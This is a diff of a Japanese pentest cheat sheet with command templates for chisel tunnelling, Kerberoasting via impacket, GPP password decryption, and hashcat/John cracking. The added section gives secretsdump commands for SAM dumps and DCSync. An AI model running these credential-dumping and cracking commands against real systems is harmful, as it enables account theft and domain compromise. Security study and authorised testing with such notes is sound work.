@@ -1,5 +1,5 @@
 # chisel
-ネットワークトンネリングツールであり、リモートポートフォワーディングやリバーストンネリングを実現するために使用されるオープンソースのツール。
+ネットワークトンネリングツールであり、リモートポートフォワーディングやリバーストンネリングを実現するために使用されるツール。
 ## Command
 サーバー側の3306にアクセスすると、Chiselトンネルを通じてクライアント側の3306にアクセスする。
 ```bash
@@ -18,13 +18,13 @@ impacket-GetUserSPNs -dc-ip <Target> <Domain>/<User>:<Password> -request -output
 ```
 
 # gpp-decrypt
-GPPに含まれるcpasswordを復号するためのツール。
+GPPに含まれるcpasswordを復号するツール。
 ```bash
 gpp-decrypt <cpassword>
 ```
 
 # hashcat
-パスワードハッシュを高速に解析・復元するオープンソースツール。
+パスワードハッシュを高速に解析・復号するツール。
 ```bash
 hashcat -m 3200 <File> <Wordlist> # bcrypt
 hashcat -a 0 -m 5200 <File> <Wordlist> # psafe3
@@ -38,7 +38,7 @@ hashid '<ハッシュ>'
 ```
 
 # John The Ripper
-主にパスワードクラッキングに使用される、無料でオープンソースのソフトウェアツール。
+主にパスワードクラッキングに使用されるツール。
 ## Command
 ```bash
 john <File> -w=<Wordlist> # 基本
@@ -54,7 +54,13 @@ zip2john <Zip> > <ouput> # ロックされているzipファイルをハッシ�
 keepass2john <keepass> > <output> # ロックされているkeepassファイルをハッシュに変換
 ```
 
-
+# secretsdump
+認証情報のダンプツール。
+```bash
+impacket-secretsdump.py -sam <SAM> -system <SYSTEM> local # SAMとSYSTEMレジストリから認証情報をダンプ
+impacket-secretsdump.py <Domain>/<User>@<Target> # DCSync
+impacket-secretsdump.py -just-dc <Domain>/<User>@<Target> # DCSync
+```
 
 
 
